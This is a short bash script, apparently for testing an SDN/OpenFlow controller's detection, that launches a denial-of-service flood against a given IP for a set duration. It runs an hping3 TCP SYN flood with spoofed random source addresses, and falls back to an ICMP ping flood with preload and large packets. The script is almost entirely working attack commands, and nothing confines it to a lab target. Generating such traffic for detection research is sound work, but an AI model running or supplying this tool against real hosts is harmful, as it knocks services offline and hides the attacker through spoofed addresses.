#!/bin/bash
# DDoS Attack Simulation - High-rate flooding attack (Optimized)

TARGET=$1
DURATION=${2:-30}
RATE=${3:-2000}  # target rate in packets per second (for non-flood modes)

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
    exit 1
fi

echo "Starting DDoS attack on $TARGET for $DURATION seconds..."

# Method 1: Use hping3 (Preferred for SDN testing)
# This sends TCP SYN packets which are more likely to trigger flow entries 
# in the OpenFlow switch and detection in your controller.
if command -v hping3 &> /dev/null; then
    echo "Using hping3 for TCP SYN flood (Half-Open attack)..."
    # -S: SYN flag, -p 80: target port, --flood: as fast as possible, --rand-source: spoofed IPs
    timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1
    
# Method 2: High-rate native Ping Flood
# This uses the native Linux flood flag (-f) which is much faster than Bash loops.
else
    echo "hping3 not found. Using native ICMP flood..."
    # -f: Flood mode (outputs dots for sent, backspaces for received)
    # -l: Preload (sends specified number of packets without waiting for reply)
    # -s: Packet size (1400 bytes to saturate bandwidth)
    timeout $DURATION sudo ping -f -l $RATE -s 1400 $TARGET > /dev/null 2>&1
fi

echo "DDoS attack completed"